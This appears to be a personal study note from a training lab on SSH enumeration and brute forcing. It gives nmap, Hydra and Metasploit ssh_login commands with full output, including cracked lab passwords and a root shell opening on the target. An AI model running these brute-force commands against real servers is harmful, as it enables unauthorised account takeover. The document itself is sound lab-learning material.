# SSH

## Enumeration

Algos

```bash
root@attackdefense:~# nmap $target -p22 --script ssh2-enum-algos
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 10:55 UTC
Nmap scan report for target-1 (192.205.229.3)
Host is up (0.000032s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh2-enum-algos:
|   kex_algorithms: (6)
|       curve25519-sha256@libssh.org
|       ecdh-sha2-nistp256
|       ecdh-sha2-nistp384
|       ecdh-sha2-nistp521
|       diffie-hellman-group-exchange-sha256
|       diffie-hellman-group14-sha1
|   server_host_key_algorithms: (5)
|       ssh-rsa
|       rsa-sha2-512
|       rsa-sha2-256
|       ecdsa-sha2-nistp256
|       ssh-ed25519
|   encryption_algorithms: (6)
|       chacha20-poly1305@openssh.com
|       aes128-ctr
|       aes192-ctr
|       aes256-ctr
|       aes128-gcm@openssh.com
|       aes256-gcm@openssh.com
|   mac_algorithms: (10)
|       umac-64-etm@openssh.com
|       umac-128-etm@openssh.com
|       hmac-sha2-256-etm@openssh.com
|       hmac-sha2-512-etm@openssh.com
|       hmac-sha1-etm@openssh.com
|       umac-64@openssh.com
|       umac-128@openssh.com
|       hmac-sha2-256
|       hmac-sha2-512
|       hmac-sha1
|   compression_algorithms: (2)
|       none
|_      zlib@openssh.com
MAC Address: 02:42:C0:CD:E5:03 (Unknown)
```

Host Key

```bash
root@attackdefense:~# nmap $target -p22 --script ssh-hostkey --script-args ssh_hostkey=full
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 10:56 UTC
Nmap scan report for target-1 (192.205.229.3)
Host is up (0.000047s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC1fkJK7F8yxf3vewEcLYHljBnKTAiRqzFxkFo6lqyew73ATL2Abyh6at/oOmBSlPI90rtAMA6jQGJ+0HlHgf7mkjz5+CBo9j2VPu1bejYtcxpqpHcL5Bp12wgey1zup74fgd+yOzILjtgbnDOw1+HSkXqN79d+4BnK0QF6T9YnkHvBhZyjzIDmjonDy92yVBAIoB6Rdp0w7nzFz3aN9gzB5MW/nSmgc4qp7R6xtzGaqZKp1H3W3McZO3RELjGzvHOdRkAKL7n2kyVAraSUrR0Oo5m5e/sXrITYi9y0X6p2PTUfYiYvgkv/3xUF+5YDDA33AJvv8BblnRcRRZ74BxaD
|   ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBB0cJ/kSOXBWVIBA2QH4UB6r7nFL5l7FwHubbSZ9dIs2JSmn/oIgvvQvxmI5YJxkdxRkQlF01KLDmVgESYXyDT4=
|_  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKuZlCFfTgeaMC79zla20ZM2q64mjqWhKPw/2UzyQ2W/
MAC Address: 02:42:C0:CD:E5:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Auth Methods

```bash
root@attackdefense:~# nmap $target -p22 --script ssh-auth-methods
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 10:57 UTC
Nmap scan report for target-1 (192.205.229.3)
Host is up (0.000045s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
MAC Address: 02:42:C0:CD:E5:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.58 seconds

root@attackdefense:~# nmap $target -p22 --script ssh-auth-methods --script-args="ssh.user=student"
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 10:58 UTC
Nmap scan report for target-1 (192.205.229.3)
Host is up (0.000041s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|_  Supported authentication methods: none_auth
MAC Address: 02:42:C0:CD:E5:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds

root@attackdefense:~# nmap $target -p22 --script ssh-auth-methods --script-args="ssh.user=admin"
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 10:58 UTC
Nmap scan report for target-1 (192.205.229.3)
Host is up (0.000045s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
MAC Address: 02:42:C0:CD:E5:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.04 seconds
root@attackdefense:~# nmap $target -p22 --script ssh-auth-methods --script-args="ssh.user=root"
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 10:58 UTC
Nmap scan report for target-1 (192.205.229.3)
Host is up (0.000035s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
MAC Address: 02:42:C0:CD:E5:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds
```

## Brute Force

### Hydra

```bash
root@attackdefense:~# hydra -l student -P /usr/share/wordlists/rockyou.txt $target ssh
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-17 11:04:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.42.3.3:22/
[STATUS] 177.00 tries/min, 177 tries in 00:01h, 14344223 to do in 1350:41h, 16 active
[22][ssh] host: 192.42.3.3   login: student   password: friend
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-17 11:06:28
```

### nmap

```bash
root@attackdefense:~# cat users.txt
administrator

root@attackdefense:~# nmap $target -p22 --script ssh-brute --script-args userdb=/root/users.txt
Starting Nmap 7.70 ( https://nmap.org ) at 2024-01-17 11:08 UTC
NSE: [ssh-brute] Trying username/password pair: administrator:administrator
NSE: [ssh-brute] Trying username/password pair: administrator:
NSE: [ssh-brute] Trying username/password pair: administrator:123456
NSE: [ssh-brute] Trying username/password pair: administrator:12345
NSE: [ssh-brute] Trying username/password pair: administrator:123456789
NSE: [ssh-brute] Trying username/password pair: administrator:password
NSE: [ssh-brute] Trying username/password pair: administrator:iloveyou
NSE: [ssh-brute] Trying username/password pair: administrator:princess
NSE: [ssh-brute] Trying username/password pair: administrator:12345678
NSE: [ssh-brute] Trying username/password pair: administrator:1234567
NSE: [ssh-brute] Trying username/password pair: administrator:abc123
NSE: [ssh-brute] Trying username/password pair: administrator:nicole
NSE: [ssh-brute] Trying username/password pair: administrator:daniel
NSE: [ssh-brute] Trying username/password pair: administrator:monkey
NSE: [ssh-brute] Trying username/password pair: administrator:babygirl
NSE: [ssh-brute] Trying username/password pair: administrator:qwerty
NSE: [ssh-brute] Trying username/password pair: administrator:lovely
NSE: [ssh-brute] Trying username/password pair: administrator:654321
NSE: [ssh-brute] Trying username/password pair: administrator:michael
NSE: [ssh-brute] Trying username/password pair: administrator:jessica
NSE: [ssh-brute] Trying username/password pair: administrator:111111
NSE: [ssh-brute] Trying username/password pair: administrator:ashley
NSE: [ssh-brute] Trying username/password pair: administrator:000000
NSE: [ssh-brute] Trying username/password pair: administrator:iloveu
NSE: [ssh-brute] Trying username/password pair: administrator:michelle
NSE: [ssh-brute] Trying username/password pair: administrator:tigger
NSE: [ssh-brute] Trying username/password pair: administrator:sunshine
NSE: [ssh-brute] Trying username/password pair: administrator:chocolate
Nmap scan report for target-1 (192.42.3.3)
Host is up (0.000053s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-brute:
|   Accounts:
|     administrator:sunshine - Valid credentials
|_  Statistics: Performed 28 guesses in 6 seconds, average tps: 4.7
MAC Address: 02:42:C0:2A:03:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds
```

### Metasploit

```bash
msf5 > use auxiliary/scanner/ssh/ssh_login

msf5 auxiliary(scanner/ssh/ssh_login) > options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.42.3.3
RHOSTS => 192.42.3.3

msf5 auxiliary(scanner/ssh/ssh_login) > set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
USERPASS_FILE => /usr/share/wordlists/metasploit/root_userpass.txt

msf5 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true

## Bad idea
msf5 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
VERBOSE => true


msf5 auxiliary(scanner/ssh/ssh_login) > run

[-] 192.42.3.3:22 - Failed: 'root:'
[!] No active DB -- Credential data will not be saved!
[-] 192.42.3.3:22 - Failed: 'root:!root'
[-] 192.42.3.3:22 - Failed: 'root:Cisco'
[-] 192.42.3.3:22 - Failed: 'root:NeXT'
[-] 192.42.3.3:22 - Failed: 'root:QNX'
[-] 192.42.3.3:22 - Failed: 'root:admin'
[+] 192.42.3.3:22 - Success: 'root:attack' 'uid=0(root) gid=0(root) groups=0(root) Linux victim-1 5.4.0-152-generic #169-Ubuntu SMP Tue Jun 6 22:23:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.42.3.2:33785 -> 192.42.3.3:22) at 2024-01-17 11:12:49 +0000
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
